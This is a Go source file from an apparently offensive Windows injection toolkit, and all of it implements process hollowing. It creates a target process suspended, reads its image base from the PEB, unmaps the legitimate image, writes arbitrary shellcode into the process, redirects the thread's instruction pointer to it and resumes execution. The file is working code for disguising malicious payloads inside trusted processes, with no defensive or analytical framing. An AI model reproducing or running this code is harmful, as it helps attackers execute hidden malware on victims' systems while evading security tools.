// +build windows

package injection

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// ProcessHollowingInjector implements process hollowing injection
type ProcessHollowingInjector struct{}

// Method returns the injection method
func (i *ProcessHollowingInjector) Method() InjectionMethod {
	return MethodProcessHollowing
}

// Description returns a description of the injection method
func (i *ProcessHollowingInjector) Description() string {
	return "Process Hollowing: Creates a legitimate process in suspended state, " +
		"unmaps its memory, replaces it with shellcode, and resumes execution. " +
		"Steps: CreateProcess(SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread"
}

// Inject performs process hollowing injection
func (i *ProcessHollowingInjector) Inject(config *Config) (*Result, error) {
	// Validate configuration
	if err := config.Validate(i.Method()); err != nil {
		return &Result{Success: false, Error: err.Error()}, err
	}

	// 1. Create a new process in suspended state
	pi, err := CreateProcess(config.TargetPath, "", true)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to create suspended process: %v", err),
		}, err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 2. Get the thread context to find the image base address
	ctx, err := GetThreadContext(pi.Thread)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to get thread context: %v", err),
		}, err
	}

	// For x64, the PEB address is in RDX
	// The image base address is at PEB+0x10 (ImageBaseAddress field)
	// We'll use a fixed base address for simplicity (0x400000 is common)
	// In a real implementation, you would read the PEB to get the actual base
	var imageBase uintptr = 0x400000

	// Alternative: Try to read from the context
	// Note: This is simplified - a complete implementation would parse the PEB
	if ctx.Rdx != 0 {
		// Read the ImageBaseAddress from PEB
		// PEB is at RDX, ImageBaseAddress is at offset 0x10
		pebImageBaseOffset := ctx.Rdx + 0x10

		// Read the pointer at PEB+0x10
		buffer := make([]byte, 8)
		_, err := ReadProcessMemory(pi.Process, uintptr(pebImageBaseOffset), buffer)
		if err == nil {
			// Convert bytes to uintptr (little endian)
			imageBase = uintptr(buffer[0]) |
				uintptr(buffer[1])<<8 |
				uintptr(buffer[2])<<16 |
				uintptr(buffer[3])<<24 |
				uintptr(buffer[4])<<32 |
				uintptr(buffer[5])<<40 |
				uintptr(buffer[6])<<48 |
				uintptr(buffer[7])<<56
		}
	}

	// 3. Unmap the legitimate image from the process
	err = NtUnmapViewOfSection(pi.Process, imageBase)
	if err != nil {
		// Unmapping might fail, but we can still continue
		// The process might still work if we allocate at a different address
		fmt.Printf("[WARN] NtUnmapViewOfSection failed (this is sometimes expected): %v\n", err)
	}

	// 4. Allocate memory at the image base address
	// Note: We're allocating at the original base address
	// In a real implementation with PE injection, you'd need to handle relocations
	addr, err := VirtualAllocEx(pi.Process, imageBase, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		// If allocation at image base fails, try allocating anywhere
		addr, err = VirtualAllocEx(pi.Process, 0, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if err != nil {
			return &Result{
				Success: false,
				Error:   fmt.Sprintf("failed to allocate memory in process: %v", err),
			}, err
		}
	}

	// 5. Write shellcode to the allocated memory
	_, err = WriteProcessMemory(pi.Process, addr, config.Shellcode)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to write shellcode: %v", err),
		}, err
	}

	// 6. Change memory protection to executable
	_, err = VirtualProtectEx(pi.Process, addr, uintptr(len(config.Shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to change memory protection: %v", err),
		}, err
	}

	// 7. Update the thread context to point to the shellcode
	ctx.Rip = uint64(addr)

	// Note: In a complete PE injection implementation, you would also need to:
	// - Update the image base address in the PEB
	// - Handle relocations if allocating at a different address
	// - Set up proper stack alignment

	err = SetThreadContext(pi.Thread, ctx)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to set thread context: %v", err),
		}, err
	}

	// 8. Resume the thread to execute the shellcode
	_, err = ResumeThread(pi.Thread)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to resume thread: %v", err),
		}, err
	}

	return &Result{
		Success:   true,
		ProcessID: pi.ProcessID,
		ThreadID:  pi.ThreadID,
	}, nil
}